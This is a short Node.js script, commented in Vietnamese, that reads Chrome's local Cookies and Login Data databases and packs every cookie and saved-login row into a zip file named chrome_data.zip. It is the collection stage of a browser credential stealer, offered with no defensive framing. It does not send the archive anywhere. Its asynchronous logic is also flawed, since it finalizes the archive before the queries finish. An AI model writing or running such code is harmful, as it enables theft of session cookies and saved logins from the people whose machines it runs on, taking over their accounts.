const fs = require('fs');
const archiver = require('archiver');
const sqlite3 = require('sqlite3').verbose();

// Thư mục lưu trữ file zip
const outputDir = './output';
if (!fs.existsSync(outputDir)) {
  fs.mkdirSync(outputDir);
}

// Tên file zip
const zipName = 'chrome_data.zip';

// Đường dẫn đến thư mục lưu trữ file zip
const output = fs.createWriteStream(`${outputDir}/${zipName}`);
const archive = archiver('zip', { zlib: { level: 9 } });
archive.pipe(output);

// Lấy thông tin cookie của Chrome
const cookiesDBPath = `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\Cookies`;
const cookiesDB = new sqlite3.Database(cookiesDBPath);
const cookiesQuery = 'SELECT * FROM cookies';
cookiesDB.all(cookiesQuery, (err, rows) => {
  if (err) {
    console.error(err);
    return;
  }
  rows.forEach(row => {
    archive.append(JSON.stringify(row), { name: `cookies_${row.name}.json` });
  });
});

// Lấy thông tin mật khẩu của Chrome
const loginDataDBPath = `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\Login Data`;
const loginDataDB = new sqlite3.Database(loginDataDBPath);
const loginDataQuery = 'SELECT * FROM logins';
loginDataDB.all(loginDataQuery, (err, rows) => {
  if (err) {
    console.error(err);
    return;
  }
  rows.forEach(row => {
    archive.append(JSON.stringify(row), { name: `logins_${row.username_value}.json` });
  });
});

// Kết thúc quá trình nén file
archive.finalize();